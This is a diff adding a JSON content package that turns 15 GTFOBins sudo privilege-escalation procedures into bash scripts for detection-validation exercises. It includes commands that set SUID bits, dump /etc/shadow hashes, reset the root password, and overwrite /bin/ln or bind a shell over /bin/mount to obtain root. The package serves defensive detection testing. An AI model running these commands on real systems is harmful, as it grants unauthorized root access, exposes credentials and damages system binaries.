@@ -1,0 +1,764 @@
+{
+  "package_id": "gtfobins-privilege-escalation-sudo-v1",
+  "package_name": "GTFOBins - Privilege Escalation / Sudo",
+  "version": "1.0.0",
+  "summary": "15 source-derived GTFOBins Living-Off-The-Land procedures for privilege escalation / Sudo.",
+  "description": "Faithful, deterministic conversion of explicit GTFOBins procedures. Commands retain upstream behavior while environment values use Morgana Tags.",
+  "purpose": "Run authorized Living-Off-The-Land detection validation using legitimate native or commonly available utilities in adversary-like ways.",
+  "capabilities": [
+    "Provides 15 distinct source procedures grouped by privilege-escalation / Sudo.",
+    "Preserves source identity, ATT&CK mappings, execution context, prerequisites, and provider metadata.",
+    "Supports deterministic content-only updates from pinned upstream commits."
+  ],
+  "use_cases": [
+    "Validate endpoint and network detections for authorized Living-Off-The-Land behavior.",
+    "Search and import only the utility, function, context, platform, or ATT&CK coverage needed for an exercise."
+  ],
+  "safety_notes": [
+    "Review every command, Tag, privilege requirement, and readiness classification before execution.",
+    "Interactive, elevated, SUID, capability, and counterpart-dependent procedures require an explicitly prepared lab.",
+    "No upstream command is executed during conversion or import."
+  ],
+  "prerequisites": [
+    "The referenced Linux/Unix binary must exist on the target.",
+    "Operator-supplied Tags and any declared privilege or network counterpart must be configured.",
+    "Explicit authorization for the target and procedure behavior."
+  ],
+  "author": "GTFOBins / X3M.AI conversion",
+  "created": "2026-08-28",
+  "script_prefix": "GTFOBINS - ",
+  "provider": "gtfobins",
+  "source": "gtfobins",
+  "source_repository": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "source_commit": "acd524623f9c406acedd2754ebd9c2431f3675ad",
+  "source_license": "GPL-3.0",
+  "documentation_url": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Privilege Escalation",
+  "mitre_tcodes": [
+    "T1548"
+  ],
+  "platform": [
+    "linux"
+  ],
+  "risk_badges": [
+    "modify"
+  ],
+  "readiness_counts": {
+    "environment_prerequisite": 15
+  },
+  "category": "lotl/gtfobins",
+  "tag_categories": [
+    {
+      "category_id": "lotl_gtfobins_parameters",
+      "label": "GTFOBins Runtime Parameters",
+      "description": "Operator-supplied values shared by Living-Off-The-Land procedures.",
+      "scope": "local",
+      "tags": [
+        {
+          "key": "lotl_gtfobins_input_file",
+          "label": "Input File",
+          "description": "Operator-supplied input file for this authorized LOTL procedure. Source token: /path/to/input-file.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "input_file"
+        },
+        {
+          "key": "lotl_gtfobins_output_file",
+          "label": "Output File",
+          "description": "Operator-supplied output file for this authorized LOTL procedure. Source token: /path/to/output-file.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "output_file"
+        }
+      ]
+    }
+  ],
+  "assets": [],
+  "scripts": [
+    {
+      "id": "gtfobins:chattr:privilege-escalation:0:sudo::",
+      "name": "GTFOBINS - T1548 - chattr - Privilege escalation - Sudo [e173942]",
+      "description": "This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Binary: chattr. Context: Sudo. Make the target file immutable.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "chattr +i #{lotl_gtfobins_input_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/chattr",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/chattr",
+        "source_bin": "chattr",
+        "function": "privilege-escalation",
+        "function_label": "Privilege escalation",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {},
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:chattr:privilege-escalation:0:sudo::",
+        "source_name": "chattr",
+        "source_tcodes": [
+          "T1548"
+        ],
+        "category": "privilege-escalation",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `chattr` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:chmod:privilege-escalation:0:sudo::",
+      "name": "GTFOBINS - T1548 - chmod - Privilege escalation - Sudo [280c400]",
+      "description": "This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Binary: chmod. Context: Sudo. This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "chmod 6777 #{lotl_gtfobins_input_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/chmod",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/chmod",
+        "source_bin": "chmod",
+        "function": "privilege-escalation",
+        "function_label": "Privilege escalation",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {},
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:chmod:privilege-escalation:0:sudo::",
+        "source_name": "chmod",
+        "source_tcodes": [
+          "T1548"
+        ],
+        "category": "privilege-escalation",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `chmod` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:chown:privilege-escalation:0:sudo::",
+      "name": "GTFOBINS - T1548 - chown - Privilege escalation - Sudo [03b46c7]",
+      "description": "This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Binary: chown. Context: Sudo. This can be run with elevated privileges to change ownership and then read, write, or execute a file.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "chown $(id -un):$(id -gn) #{lotl_gtfobins_input_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/chown",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/chown",
+        "source_bin": "chown",
+        "function": "privilege-escalation",
+        "function_label": "Privilege escalation",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {},
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:chown:privilege-escalation:0:sudo::",
+        "source_name": "chown",
+        "source_tcodes": [
+          "T1548"
+        ],
+        "category": "privilege-escalation",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `chown` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:cp:privilege-escalation:0:sudo::",
+      "name": "GTFOBINS - T1548 - cp - Privilege escalation - Sudo [e3a4b1d]",
+      "description": "This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Binary: cp. Context: Sudo. This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "cp #{lotl_gtfobins_input_file} #{lotl_gtfobins_output_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/cp",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/cp",
+        "source_bin": "cp",
+        "function": "privilege-escalation",
+        "function_label": "Privilege escalation",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {},
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:cp:privilege-escalation:0:sudo::",
+        "source_name": "cp",
+        "source_tcodes": [
+          "T1548"
+        ],
+        "category": "privilege-escalation",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `cp` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:cp:privilege-escalation:1:sudo::",
+      "name": "GTFOBINS - T1548 - cp - Privilege escalation - Sudo [9b42e8c]",
+      "description": "This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Binary: cp. Context: Sudo. This can copy SUID permissions from any SUID binary (e.g., `/path/to/input-file`) to another.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "cp --attributes-only --preserve=all #{lotl_gtfobins_input_file} #{lotl_gtfobins_output_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/cp",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/cp",
+        "source_bin": "cp",
+        "function": "privilege-escalation",
+        "function_label": "Privilege escalation",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {},
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:cp:privilege-escalation:1:sudo::",
+        "source_name": "cp",
+        "source_tcodes": [
+          "T1548"
+        ],
+        "category": "privilege-escalation",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `cp` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:getent:privilege-escalation:0:sudo::",
+      "name": "GTFOBINS - T1548 - getent - Privilege escalation - Sudo [f83cb90]",
+      "description": "This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Binary: getent. Context: Sudo. This allows to dump password hashes from the `/etc/shadow` file.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "getent shadow",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/getent",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/getent",
+        "source_bin": "getent",
+        "function": "privilege-escalation",
+        "function_label": "Privilege escalation",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {},
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:getent:privilege-escalation:0:sudo::",
+        "source_name": "getent",
+        "source_tcodes": [
+          "T1548"
+        ],
+        "category": "privilege-escalation",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `getent` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:install:privilege-escalation:0:sudo::",
+      "name": "GTFOBINS - T1548 - install - Privilege escalation - Sudo [381785e]",
+      "description": "This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Binary: install. Context: Sudo. This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "install -m 6777 #{lotl_gtfobins_input_file} /path/to/output-dir/",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/install",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/install",
+        "source_bin": "install",
+        "function": "privilege-escalation",
+        "function_label": "Privilege escalation",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {},
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:install:privilege-escalation:0:sudo::",
+        "source_name": "install",
+        "source_tcodes": [
+          "T1548"
+        ],
+        "category": "privilege-escalation",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `install` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:ln:privilege-escalation:0:sudo::",
+      "name": "GTFOBINS - T1548 - ln - Privilege escalation - Sudo [66b36d3]",
+      "description": "This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Binary: ln. Context: Sudo. This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "ln -fs /bin/sh /bin/ln\nln",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/ln",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/ln",
+        "source_bin": "ln",
+        "function": "privilege-escalation",
+        "function_label": "Privilege escalation",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {},
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:ln:privilege-escalation:0:sudo::",
+        "source_name": "ln",
+        "source_tcodes": [
+          "T1548"
+        ],
+        "category": "privilege-escalation",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `ln` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:mount:privilege-escalation:0:sudo::",
+      "name": "GTFOBINS - T1548 - mount - Privilege escalation - Sudo [80d0804]",
+      "description": "This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Binary: mount. Context: Sudo. This overrides `mount` itself with a shell (or any other executable).",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "mount -o bind /bin/sh /bin/mount\nmount",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/mount",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/mount",
+        "source_bin": "mount",
+        "function": "privilege-escalation",
+        "function_label": "Privilege escalation",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {},
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:mount:privilege-escalation:0:sudo::",
+        "source_name": "mount",
+        "source_tcodes": [
+          "T1548"
+        ],
+        "category": "privilege-escalation",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `mount` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:mv:privilege-escalation:0:sudo::",
+      "name": "GTFOBINS - T1548 - mv - Privilege escalation - Sudo [beb78c2]",
+      "description": "This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Binary: mv. Context: Sudo. This can be used to move and then read or write files from a restricted file systems or with elevated privileges.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "mv #{lotl_gtfobins_input_file} #{lotl_gtfobins_output_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/mv",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/mv",
+        "source_bin": "mv",
+        "function": "privilege-escalation",
+        "function_label": "Privilege escalation",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {},
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:mv:privilege-escalation:0:sudo::",
+        "source_name": "mv",
+        "source_tcodes": [
+          "T1548"
+        ],
+        "category": "privilege-escalation",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `mv` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:passwd:privilege-escalation:0:sudo::",
+      "name": "GTFOBINS - T1548 - passwd - Privilege escalation - Sudo [55f8427]",
+      "description": "This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Binary: passwd. Context: Sudo. This changes the root password to `x`, so it's now possible to log in using, for example, `su`.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo -e 'x\\nx' | passwd",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/passwd",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/passwd",
+        "source_bin": "passwd",
+        "function": "privilege-escalation",
+        "function_label": "Privilege escalation",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {},
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:passwd:privilege-escalation:0:sudo::",
+        "source_name": "passwd",
+        "source_tcodes": [
+          "T1548"
+        ],
+        "category": "privilege-escalation",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `passwd` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:setcap:privilege-escalation:0:sudo::",
+      "name": "GTFOBINS - T1548 - setcap - Privilege escalation - Sudo [1b12ab3]",
+      "description": "This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Binary: setcap. Context: Sudo. This can be used to assign capabilities to executable files.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "setcap cap_setuid+ep /path/to/command",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/setcap",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/setcap",
+        "source_bin": "setcap",
+        "function": "privilege-escalation",
+        "function_label": "Privilege escalation",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {},
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:setcap:privilege-escalation:0:sudo::",
+        "source_name": "setcap",
+        "source_tcodes": [
+          "T1548"
+        ],
+        "category": "privilege-escalation",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `setcap` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:setfacl:privilege-escalation:0:sudo::",
+      "name": "GTFOBINS - T1548 - setfacl - Privilege escalation - Sudo [601577b]",
+      "description": "This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Binary: setfacl. Context: Sudo. This can be run with elevated privileges to change ownership and then read, write, or execute a file.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "setfacl -m u:$(id -un):rwx #{lotl_gtfobins_input_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/setfacl",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/setfacl",
+        "source_bin": "setfacl",
+        "function": "privilege-escalation",
+        "function_label": "Privilege escalation",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {},
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:setfacl:privilege-escalation:0:sudo::",
+        "source_name": "setfacl",
+        "source_tcodes": [
+          "T1548"
+        ],
+        "category": "privilege-escalation",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `setfacl` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:unsquashfs:privilege-escalation:0:sudo::",
+      "name": "GTFOBINS - T1548 - unsquashfs - Privilege escalation - Sudo [745ad4d]",
+      "description": "This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Binary: unsquashfs. Context: Sudo.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "unsquashfs shell\n./squashfs-root/sh -p",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/unsquashfs",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/unsquashfs",
+        "source_bin": "unsquashfs",
+        "function": "privilege-escalation",
+        "function_label": "Privilege escalation",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {},
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:unsquashfs:privilege-escalation:0:sudo::",
+        "source_name": "unsquashfs",
+        "source_tcodes": [
+          "T1548"
+        ],
+        "category": "privilege-escalation",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `unsquashfs` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:unzip:privilege-escalation:0:sudo::",
+      "name": "GTFOBINS - T1548 - unzip - Privilege escalation - Sudo [39680b7]",
+      "description": "This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Binary: unzip. Context: Sudo.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "unzip -K shell.zip\n./sh -p",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/unzip",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/unzip",
+        "source_bin": "unzip",
+        "function": "privilege-escalation",
+        "function_label": "Privilege escalation",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {},
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:unzip:privilege-escalation:0:sudo::",
+        "source_name": "unzip",
+        "source_tcodes": [
+          "T1548"
+        ],
+        "category": "privilege-escalation",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `unzip` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    }
+  ],
+  "chains": []
+}
